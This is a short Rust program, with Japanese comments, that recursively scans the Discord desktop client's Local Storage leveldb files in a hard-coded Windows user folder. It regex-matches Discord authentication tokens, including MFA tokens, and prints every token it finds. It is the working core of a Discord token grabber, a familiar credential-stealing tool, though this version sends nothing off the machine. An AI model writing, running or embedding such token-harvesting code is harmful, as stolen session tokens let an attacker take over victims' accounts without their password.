use std::fs::{self, File};
use std::io::{BufRead, BufReader};
use std::path::Path;
use regex::Regex;

fn main() {
    let target_dir = format!(r"C:\Users\ema\AppData\Roaming\discord\Local Storage\leveldb");

    // トークンパターン
    let token_regex = Regex::new(r"(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,})").unwrap();

    visit_dirs(Path::new(&target_dir), &token_regex);
}

// ディレクトリ再帰処理
fn visit_dirs(dir: &Path, token_regex: &Regex) {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                visit_dirs(&path, token_regex);
            } else if let Some(ext) = path.extension() {
                if ext == "ldb" || ext == "log" {
                    scan_file(&path, token_regex);
                }
            }
        }
    }
}

// ファイルから1行ずつトークン抽出
fn scan_file(path: &Path, token_regex: &Regex) {
    if let Ok(file) = File::open(path) {
        let reader = BufReader::new(file);
        for line in reader.lines().flatten() {
            for cap in token_regex.captures_iter(&line) {
                println!("{}: Found token: {}", path.display(), &cap[0]);
            }
        }
    }
}
